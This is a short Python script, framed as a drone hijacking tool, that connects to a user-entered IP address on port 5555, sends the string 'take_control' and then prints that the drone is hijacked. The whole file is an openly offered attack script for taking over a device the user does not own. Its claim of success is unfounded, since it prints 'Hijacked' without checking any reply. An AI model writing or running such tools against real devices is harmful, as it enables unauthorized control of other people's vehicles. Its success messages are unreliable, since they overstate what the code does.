import socket
import sys

def hijack_drone(target):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(f"Connecting to {target}:5555")
        s.connect((target, 5555))
        s.send(b"take_control")
        print(f"Hijacked drone at {target}")
        s.close()
    except socket.error as e:
        print(f"Couldn't connect to server: {e}")
        sys.exit()

def main():
    target = input("Enter target IP: ")
    hijack_drone(target)

if __name__ == "__main__":
    main()
